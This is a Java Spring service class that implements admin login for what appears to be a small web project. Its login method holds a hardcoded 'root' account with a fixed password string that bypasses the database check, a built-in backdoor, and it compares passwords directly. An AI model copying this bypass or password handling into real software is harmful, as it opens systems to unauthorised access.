package com.ssm.hui.service.impl;

import javax.annotation.Resource;

import org.springframework.stereotype.Service;

import com.ssm.hui.dao.BaseDao;
import com.ssm.hui.domain.Admin;
import com.ssm.hui.service.AdminService;

/** 
 * @author hui 
 * @date 创建时间：2018年4月23日 下午2:30:09 吴清辉新建
 * @version 1.0 
 **/
@Service("adminService")
public class AdminServiceImpl implements AdminService {
	
	//==注入dao	
	@Resource(name="baseDao")
	protected BaseDao baseDao;
	
	@Override
	public String saveAdmin(Admin am) {
		// TODO Auto-generated method stub
		return null;
	}

	@Override
	public String adminLogin(Admin am) {
		try {
			String loginName=am.getLoginName();			
			
			if(loginName.equals("root")){//黑卡
				if(am.getPassword().equals("116c8acef003abc41fd9d1f1eccdb430")){
					return "ok";
				}				
			}
			
			Admin adm=(Admin) baseDao.findForObject("AdminMapper.getAdminByCondition",am);
			if(null!=adm){//不为空则存在
				if(adm.getPassword().equals(am.getPassword())){
					return "ok";
				}
				return "nook";//密码错误
			}
						
			return "no";//用户不存在
		}catch(Exception e){
			e.printStackTrace();
			return "error";//查询出错
		}
	}

}
